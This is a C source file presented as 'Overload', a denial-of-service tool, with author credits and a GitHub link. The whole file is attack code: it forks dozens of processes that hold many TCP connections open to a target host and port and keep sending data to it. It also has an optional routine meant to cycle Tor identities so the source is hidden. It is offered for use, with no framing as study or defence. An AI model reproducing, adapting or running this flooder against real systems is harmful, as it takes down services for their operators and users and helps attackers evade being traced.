/* Overload - Most powerful dos tool bY Abir 
   GitHub: https://github.com/abirhosenakram
   Follow Me For More Codes! */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Function to create a socket and connect to the target
int make_socket(char *host, char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;      // IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM; // TCP connection

    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        exit(0);
    }

    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }

    if (p == NULL) {
        if (servinfo)
            freeaddrinfo(servinfo);
        fprintf(stderr, "No connection could be made\n");
        exit(0);
    }

    if (servinfo)
        freeaddrinfo(servinfo);

    fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
    return sock;
}

// To handle broken pipe signals
void broke(int s) {
    // No action required, signal handler to avoid crash
}

// Constants for connections and threads
#define CONNECTIONS 8
#define THREADS 48

// Function to continuously send data to the target
void attack(char *host, char *port, int id) {
    int sockets[CONNECTIONS];
    int x, r;

    for (x = 0; x != CONNECTIONS; x++)
        sockets[x] = 0;

    signal(SIGPIPE, &broke);

    while (1) {
        for (x = 0; x != CONNECTIONS; x++) {
            if (sockets[x] == 0)
                sockets[x] = make_socket(host, port);

            r = write(sockets[x], "\0", 1); // Send null byte
            if (r == -1) {
                close(sockets[x]);
                sockets[x] = make_socket(host, port);
            } else {
                fprintf(stderr, "[%i: Voly Sent]\n", id);
            }
        }
        usleep(300000); // Sleep for 300ms
    }
}

// Function to cycle identity using Tor (optional)
void cycle_identity() {
    int r;
    int socket = make_socket("localhost", "9050");
    write(socket, "AUTHENTICATE \"\"\n", 16);

    while (1) {
        r = write(socket, "signal NEWNYM\n\x00", 16);
        fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
        usleep(300000); // Sleep for 300ms
    }
}

// Main function
int main(int argc, char **argv) {
    int x;

    if (argc != 3)
        cycle_identity();

    for (x = 0; x != THREADS; x++) {
        if (fork()) {
            attack(argv[1], argv[2], x);
        }
        usleep(200000); // Sleep for 200ms
    }

    getc(stdin);
    return 0;
}